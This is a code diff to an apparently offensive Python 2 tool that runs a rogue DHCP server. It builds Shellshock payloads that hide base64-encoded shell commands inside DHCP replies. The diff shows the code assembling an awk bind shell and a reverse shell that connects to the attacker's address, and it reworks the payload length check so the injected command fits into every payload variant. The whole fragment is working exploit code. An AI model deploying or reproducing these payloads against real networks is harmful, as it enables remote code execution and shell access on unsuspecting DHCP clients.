@@ -256,15 +256,12 @@ def dhcp_reply(request):
                 print "[INFO] Send nak response!"
 
             else:
-                net_settings = "/bin/ip addr add " + requested_ip + \
+                net_settings = "[ -f /bin/ip ] && /bin/ip addr add " + requested_ip + \
                                "/" + network_mask + " dev eth0;"
 
                 if args.shellshock_command is not None:
                     b64command = b64encode(net_settings + args.shellshock_command)
                     shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64command + ")"
-                    if len(shellshock_url) > 255:
-                        print "[ERROR] Len of command is very big!"
-                        shellshock_url = "A"
 
                 if args.bind_shell:
                     bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
@@ -277,6 +274,10 @@ def dhcp_reply(request):
                                     your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
                     b64shell = b64encode(net_settings + reverse_shell)
                     shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+
+                if len(shellshock_url) > 255:
+                    print "[ERROR] Len of command is very big!"
+                    shellshock_url = "A"
 
                 global proxy
                 if args.proxy is None:
